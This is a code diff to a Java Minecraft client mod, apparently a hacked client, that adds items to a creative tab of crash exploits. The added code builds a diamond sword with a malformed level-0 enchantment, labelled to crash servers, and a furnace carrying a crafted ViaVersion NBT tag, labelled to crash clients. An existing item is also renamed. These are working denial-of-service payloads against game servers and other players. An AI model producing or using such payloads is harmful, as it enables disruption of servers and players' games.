@@ -38,10 +38,19 @@ public class CrashItemsCreativeTab extends CreativeTab {
         current.add(createItem(createClientCrashExperience(), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Client Crash Experience")));
         current.add(createItem(createServerCrashEntity(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Server Crash Entity"), Text.literal("Doesn't work on Paper Spigot Servers.")));
         current.add(createItem(createClientCrashArea(), Text.literal(Formatting.RED + "Client Crash Area")));
-        current.add(createItem(createSodiumClientFreezeEntity(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Sodium Client Freeze Entity")));
+        current.add(createItem(createSodiumClientFreezeEntity(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Sodium Freeze Entity")));
         current.add(createItem(this.createInstantCrashSculkItem(),
                 Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Instant Crash Block"),
                 Text.literal(Formatting.AQUA + Formatting.BOLD.toString() + "Works on Paper")
+        ));
+        //TODO: Fix NBT Data with ViaVersion NBT API
+        current.add(createItem(this.createViaVersionCrashFurnace(),
+                Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Client Crash Via Version Furnace")
+        ));
+
+        //TODO: Fix NBT Data with ViaVersion NBT API
+        current.add(createItem(this.createSwordCrasher(),
+                Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Crash Bane Sword")
         ));
 
         if (exploitFixerModule.isEnabled() && exploitFixerModule.blockInvalidIdentifierCrash.getValue()) {
@@ -49,6 +58,47 @@ public class CrashItemsCreativeTab extends CreativeTab {
         }
 
         return current;
+    }
+
+    private ItemStack createSwordCrasher() {
+        final var item = new ItemStack(Items.DIAMOND_SWORD);
+        final var base = item.getOrCreateNbt();
+        final var enchantments = new NbtList();
+
+        final var crashEnchantment = new NbtCompound();
+        crashEnchantment.putString("id", "minecraft:bane_of_arthropods");
+        crashEnchantment.putShort("lvl", (short) 0);
+
+        enchantments.add(crashEnchantment);
+        base.put("Enchantments", enchantments);
+        item.setNbt(base);
+        return item;
+    }
+
+    private ItemStack createViaVersionCrashFurnace() {
+        final var item = new ItemStack(Items.FURNACE);
+        final var base = new NbtCompound();
+
+        final var blockEntityTag = new NbtCompound();
+        final var items = new NbtList();
+
+        final var firstSlot = new NbtCompound();
+        firstSlot.putByte("Slot", (byte) 0);
+        firstSlot.putString("id", "minecraft:stone");
+        firstSlot.putByte("Count", (byte) 1);
+
+        final var tag = new NbtCompound();
+        tag.putInt("VB|Protocol1_12_2To1_13|2", 0);
+        firstSlot.put("tag", tag);
+
+        items.add(firstSlot);
+
+        blockEntityTag.put("Items", items);
+        base.put("BlockEntityTag", blockEntityTag);
+
+        item.setNbt(base);
+
+        return item;
     }
 
     private ItemStack createCrashSkull(final String value) {
